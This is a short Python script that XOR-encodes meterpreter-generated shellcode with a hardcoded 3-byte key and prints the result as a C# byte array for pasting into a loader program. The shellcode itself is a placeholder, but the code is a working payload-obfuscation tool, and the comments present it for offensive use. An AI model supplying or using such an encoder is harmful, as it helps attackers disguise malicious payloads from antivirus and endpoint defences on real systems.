# XOR Encoder for a hardcoded C# shellcode with 3-byte key

# Generate payload with meterpreter with format of csharp and then take that shellcode portion and replace the below
shellcode = bytearray([
0xeb,0x27,0x5b,0x53, ....<put your shellcode here>
])
# Put your favourite XOR keys here. This is a 3 byte XOR key
xor_key = [0xAB, 0xBB, 0xFC]

# XOR Encoding
encoded = bytearray()
for i in range(len(shellcode)):
    encoded.append(shellcode[i] ^ xor_key[i % 3])

# When this executes, you get a nice XOR-ed shellcode that you can copy and paste into your csharp program
print("byte[] buf = new byte[%d] { " % len(encoded), end='')
print(', '.join(f'0x{b:02x}' for b in encoded), end=' ')
print("};")
